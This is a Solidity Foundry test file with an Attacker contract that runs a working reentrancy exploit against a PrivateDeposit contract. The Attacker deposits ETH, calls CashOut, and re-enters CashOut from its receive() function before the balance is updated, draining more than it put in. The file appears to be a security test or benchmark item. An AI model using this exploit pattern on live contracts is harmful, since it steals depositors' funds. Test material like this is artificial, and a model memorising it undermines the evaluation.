
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PrivateDeposit, Log} from "../src/PrivateDeposit.sol";

contract TestReentrancyPrivateDeposit is Test {
    PrivateDeposit public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new PrivateDeposit();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal <= 10 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // The attacker needs to deposit first to have a balance to withdraw

        // --- 3. Funding ---
        // Fund the Victim contract (so it has ETH to steal beyond attacker's deposit)
        vm.deal(address(_contractUnderTest), attackVal * 3);
        
        // Fund the Attacker
        vm.deal(address(_attacker), attackVal * 2);

        // Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}

    fallback() external payable {}
}

contract Attacker {
    PrivateDeposit public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        victim = PrivateDeposit(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        // Deposit funds into the victim contract to establish a balance
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State - store attacker's ETH balance before attack
        initialSnapshot = address(this).balance;

        // 2. Store the value for the re-entrant call
        storedAttackVal = val;

        // 3. Call the vulnerable function - CashOut
        victim.CashOut(val);

        // 4. Verify Success Conditions
        // The attack is successful if we received more ETH than we should have
        // We deposited 'val' and should only be able to withdraw 'val' once
        // But with reentrancy, we can withdraw multiple times
        // Check if our balance increased by more than the single withdrawal amount
        // or if we withdrew more than once (attackCallCount > 1)
        if (attackCallCount > 1 && address(this).balance > initialSnapshot) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            // Re-enter the contract using the stored value
            // The balance hasn't been updated yet, so we can withdraw again
            if (address(victim).balance >= storedAttackVal) {
                victim.CashOut(storedAttackVal);
            }
        }
    }

    fallback() external payable {}
}
